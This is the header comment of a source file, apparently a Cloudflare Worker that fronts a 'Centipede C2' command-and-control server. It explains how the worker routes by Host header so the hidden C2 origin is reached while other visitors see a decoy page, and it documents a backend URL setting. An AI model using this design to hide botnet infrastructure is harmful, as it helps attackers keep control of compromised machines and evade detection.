/**
 * Centipede C2 - CDN fronting worker (Cloudflare)
 *
 * Routes on the Host header: requests for the hidden C2 hostname are
 * forwarded to the c2d origin; everyone else gets a decoy page.
 *
 * Suited for the operator REST API and dashboard. The bot WebSocket channel
 * is better served by cloudflared or a direct TLS host (Workers need the
 * WebSocket-origin bridging pattern for transparent WS proxying).
 *
 ...
 *   BACKEND_URL  - c2d origin, e.g. "https://c2.example.net" or "http://10.0.0.5:8443"
 */
